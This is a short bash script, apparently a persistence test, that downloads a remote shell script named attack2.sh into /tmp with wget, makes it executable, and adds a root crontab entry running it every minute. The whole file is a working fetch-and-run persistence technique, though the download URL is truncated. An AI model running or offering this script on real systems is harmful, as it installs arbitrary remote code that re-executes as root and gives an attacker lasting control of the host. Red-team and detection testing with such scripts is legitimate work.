#!/bin/bash

mkdir /tmp/persistencetest/

wget "https://raw.githubusercontent/...hllo.sh" -O /tmp/persistencetest/attack2.sh

sleep 5
chmod +x /tmp/persistencetest/attack2.sh
touch /var/spool/cron/root
/usr/bin/crontab /var/spool/cron/root

sleep 5

echo "*/1 * * * * /tmp/persistencetest/attack2.sh" >> /var/spool/cron/root
